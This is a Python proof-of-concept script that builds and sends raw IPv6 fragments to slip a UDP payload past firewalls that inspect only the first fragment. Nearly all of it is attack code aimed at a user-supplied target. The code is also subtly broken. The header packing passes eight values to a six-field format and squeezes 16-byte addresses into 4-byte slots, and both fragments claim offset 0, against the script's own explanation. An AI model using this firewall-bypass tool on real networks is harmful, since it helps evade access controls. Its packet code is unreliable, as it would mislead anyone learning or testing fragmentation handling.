#!/usr/bin/env python3
"""
Proof-of-Concept: IPv6 Fragmentation Header Manipulation for Access Control Bypass

This script demonstrates a vulnerability where an attacker crafts IPv6 packets with
a Fragment header placed before critical extension headers or upper-layer headers.
If the firewall inspects only the first fragment or fails to reassemble fragments
before inspection, the malicious content bypasses the access control list.

RFC 8200 Section 4.5 mandates that all headers through the first upper-layer header
must be in the first fragment. This PoC intentionally violates this rule to test
firewall compliance.

Usage:
    sudo python3 poc_ipv6_fragmentation_header_manipulation.py <target_ipv6>
"""

import struct
import socket
import sys
import random

# IPv6 Header Fields
IPV6_VERSION = 6
IPV6_TRAFFIC_CLASS = 0
IPV6_FLOW_LABEL = 0
IPV6_HOP_LIMIT = 64

# Extension Header Types
IPV6_NEXTHDR_HOP = 0
IPV6_NEXTHDR_ROUTING = 43
IPV6_NEXTHDR_FRAGMENT = 44
IPV6_NEXTHDR_AUTH = 51
IPV6_NEXTHDR_NONE = 59
IPV6_NEXTHDR_TCP = 6
IPV6_NEXTHDR_UDP = 17
IPV6_NEXTHDR_ICMP = 58

def ipv6_header(src, dst, payload_len, next_header, hop_limit=IPV6_HOP_LIMIT):
    """
    Constructs an IPv6 header.
    """
    version_traffic_class = (IPV6_VERSION << 28) | (IPV6_TRAFFIC_CLASS & 0xFF)
    flow_label = IPV6_FLOW_LABEL & 0xFFFFF
    header = struct.pack('!BBHH4s4s',
        version_traffic_class,
        flow_label >> 8,
        flow_label & 0xFF,
        payload_len,
        next_header,
        hop_limit,
        socket.inet_pton(socket.AF_INET6, src),
        socket.inet_pton(socket.AF_INET6, dst)
    )
    return header

def fragment_header(next_header, fragment_offset, m_flag, identification):
    """
    Constructs an IPv6 Fragment Header.
    
    Args:
        next_header: The Next Header value for the fragmentable part.
        fragment_offset: The offset in 8-octet units.
        m_flag: More fragments flag (1 or 0).
        identification: 32-bit identification value.
    """
    # Fragment Offset is 13 bits, Res is 2 bits, M is 1 bit
    # Combined into a 16-bit field
    frag_offset_res_m = (fragment_offset << 3) | (0 << 2) | m_flag
    header = struct.pack('!BBHI',
        next_header,
        0,  # Reserved
        frag_offset_res_m,
        identification
    )
    return header

def udp_header(src_port, dst_port, length, checksum=0):
    """
    Constructs a UDP header.
    """
    return struct.pack('!HHHH', src_port, dst_port, length, checksum)

def craft_malicious_payload():
    """
    Crafts a payload that simulates a malicious upper-layer header or data.
    In a real attack, this could be a specific TCP flag combination, a malicious
    application-layer request, or another extension header.
    """
    # Example: A simple UDP packet with a specific payload
    src_port = 12345
    dst_port = 80  # HTTP port, often blocked or restricted
    payload = b'MALICIOUS_DATA'
    udp_len = 8 + len(payload)  # UDP header length + payload
    udp_hdr = udp_header(src_port, dst_port, udp_len)
    return udp_hdr + payload

def send_fragmented_packet(target_ip, src_ip='::1'):
    """
    Sends two IPv6 fragments to the target.
    
    Fragment 1:
        - Contains the IPv6 header and a Fragment header.
        - The Fragment header's Next Header points to UDP (17).
        - Contains NO extension headers or upper-layer headers.
        - This violates RFC 8200 Section 4.5, which requires all headers
          through the first upper-layer header to be in the first fragment.
    
    Fragment 2:
        - Contains the UDP header and payload.
        - If the firewall only inspects the first fragment, it sees a benign
          Fragment header and allows the packet. The malicious UDP payload
          in the second fragment bypasses the firewall.
    """
    identification = random.randint(0, 0xFFFFFFFF)
    
    # --- Craft Fragment 1 ---
    # IPv6 Header
    # Next Header is 44 (Fragment)
    # Payload Length is the length of the Fragment header (8 bytes)
    frag1_payload_len = 8
    ipv6_hdr1 = ipv6_header(src_ip, target_ip, frag1_payload_len, IPV6_NEXTHDR_FRAGMENT)
    
    # Fragment Header
    # Next Header is 17 (UDP) - indicating the fragmentable part starts with UDP
    # Fragment Offset is 0
    # M flag is 1 (more fragments)
    frag_hdr1 = fragment_header(IPV6_NEXTHDR_UDP, 0, 1, identification)
    
    # Fragment 1 packet
    frag1_packet = ipv6_hdr1 + frag_hdr1
    
    # --- Craft Fragment 2 ---
    # IPv6 Header
    # Next Header is 44 (Fragment)
    # Payload Length is the length of the Fragment header (8 bytes) + UDP payload
    malicious_payload = craft_malicious_payload()
    frag2_payload_len = 8 + len(malicious_payload)
    ipv6_hdr2 = ipv6_header(src_ip, target_ip, frag2_payload_len, IPV6_NEXTHDR_FRAGMENT)
    
    # Fragment Header
    # Next Header is 17 (UDP) - consistent with Fragment 1
    # Fragment Offset is 0 (since the first fragment had no fragmentable data)
    # M flag is 0 (last fragment)
    frag_hdr2 = fragment_header(IPV6_NEXTHDR_UDP, 0, 0, identification)
    
    # Fragment 2 packet
    frag2_packet = ipv6_hdr2 + frag_hdr2 + malicious_payload
    
    # --- Send Packets ---
    # Create raw socket
    sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_IPV6)
    
    try:
        # Send Fragment 1
        sock.sendto(frag1_packet, (target_ip, 0, 0, 0))
        print(f"[+] Sent Fragment 1 (Offset 0, M=1) to {target_ip}")
        
        # Send Fragment 2
        sock.sendto(frag2_packet, (target_ip, 0, 0, 0))
        print(f"[+] Sent Fragment 2 (Offset 0, M=0) to {target_ip}")
        
        print("[+] Packet transmission complete.")
        print("[*] If the target firewall is vulnerable, it will allow the packet through.")
        print("[*] If the target firewall is compliant with RFC 8200, it should drop the packet.")
    except Exception as e:
        print(f"[-] Error sending packets: {e}")
    finally:
        sock.close()

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <target_ipv6>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    send_fragmented_packet(target_ip)
